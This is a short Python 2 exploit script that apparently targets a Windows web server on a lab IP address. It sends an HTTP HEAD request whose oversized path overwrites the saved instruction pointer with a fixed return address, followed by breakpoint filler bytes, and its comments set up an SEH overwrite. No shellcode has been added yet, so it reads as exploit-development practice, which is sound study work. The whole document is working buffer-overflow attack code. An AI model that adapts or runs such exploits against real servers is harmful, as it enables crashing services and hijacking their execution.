#!/usr/bin/python

import sys
import struct
import socket

host = "192.168.214.135"
port = 8080

nseh_offset = 582
seh_offset = 586
total_buffer = 586 + 4
eip_offset = 515

crash_template = (
    "HEAD /{} HTTP/1.1\r\n"
    "Host: 192.168.214.135:8080\r\n"
    "Content-Type: application/x-www-form-urlencoded\r\n"
    "User-Agent: Mozilla/4.0 (Windows XP 5.1) Java/1.6.0_03\r\n"
    "Content-Length: 1048580\r\n\r\n"
)

junk1 = "\x41" * eip_offset
eip = struct.pack("<L", 0x77FAB127)
junk2 = "\xCC" * (total_buffer - eip_offset - len(eip))
#nseh = "\xCC" * 4
#seh = "\xCC" * 4
payload = junk1 + eip + junk2
#junk2 = "\x44" * (total_buffer - seh_offset - len(seh) -len(nseh))

#payload = junk1 + nseh + seh + junk2
crash_send = crash_template.format(payload)

try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #SOCK_STREAM for TCP
        s.connect((host, port))
        #s.recv(500)
        s.send(crash_send)
        s.close()
except:
        print "socket() failed"
        sys.exit(1)